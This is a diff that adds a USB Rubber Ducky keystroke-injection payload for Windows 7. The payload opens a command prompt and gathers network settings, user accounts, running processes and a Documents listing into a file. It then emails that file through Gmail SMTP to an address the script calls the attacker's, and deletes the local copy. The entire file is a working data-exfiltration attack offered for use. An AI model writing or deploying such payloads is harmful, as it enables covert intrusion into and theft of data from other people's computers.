@@ -1,0 +1,52 @@
+REM WIN7 RECON SCRIPT - UK KEYBOARD VERSION
+MAP UK
+DELAY 2000
+GUI
+DELAY 800
+STRING cmd.exe
+DELAY 100
+ENTER
+DELAY 1000
+REM collect some data on the target machine 
+STRING ipconfig > recon_data.txt &  whoami >> recon_data.txt & getmac >> recon_data.txt
+DELAY 50
+ENTER
+DELAY 400
+STRING net user >> recon_data.txt &  tasklist >> recon_data.txt & DIR  Documents >> recon_data.txt
+DELAY 50
+ENTER
+DELAY 400
+REM email the recon_data.txt file back to attacker
+STRING powershell
+ENTER
+DELAY 750
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('hacker@googlemail.com', 'Password$')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'hacker@googlemail.com'
+ENTER
+STRING $ReportEmail.To.Add('hacker@googlemail.com')
+ENTER
+STRING $ReportEmail.Subject = 'Recon Data Test'
+ENTER
+STRING $ReportEmail.Body = (Get-Content recon_data.txt | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 2000
+STRING del recon_data.txt
+ENTER
+STRING exit
+ENTER
+DELAY 50
+STRING exit
+ENTER
+
+
